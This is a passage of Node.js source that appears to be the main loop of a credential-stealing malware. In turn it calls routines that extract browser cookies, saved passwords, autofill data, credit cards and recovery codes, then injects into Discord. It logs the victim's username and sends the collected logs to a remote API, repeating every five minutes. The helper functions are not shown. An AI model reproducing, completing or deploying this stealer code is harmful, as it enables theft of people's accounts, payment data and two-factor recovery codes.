            logs += "GetToken: " + path + "\nComputer Name: " + os.userInfo().username + "\n";
        }
        try {
            await ExtractAllCookies();
        } catch (path) { }
        try {
            await GetPasswords();
        } catch (path) { }
        try {
            await GetAutoFills();
        } catch (path) { }
        try {
            await GetCreditCards();
        } catch (path) { }
        try {
            await GetInfo();
        } catch (path) {
            logs += "GetInfo: " + path + "\nComputer Name: " + os.userInfo().username + "\n";
        }
        try {
            await GetRecoveryCodes();
        } catch (path) {
            logs += "GetRecoveryCodes: " + path + "\nComputer Name: " + os.userInfo().username + "\n";
        }
        try {
            await injectDiscord();
        } catch (path) {
            logs += "injectDiscord: " + path + "\nComputer Name: " + os.userInfo().username + "\n";
        }
        if (fs < 3) {
            await Sleep(5000);
        }
    }
    await Sleep(1000);
    await sendLogsToAPI();
    setTimeoutFn(() => {
        Main()["catch"](fs => {
            console.error("Erro na execução do Main (recursivo):", fs);
        });
    }, 300000);
}
Main()["catch"](fs => {
    console.error("Erro na execução inicial do Main:", fs);
    console.error("Stack trace:", fs.stack);
    process.exit(1);
});
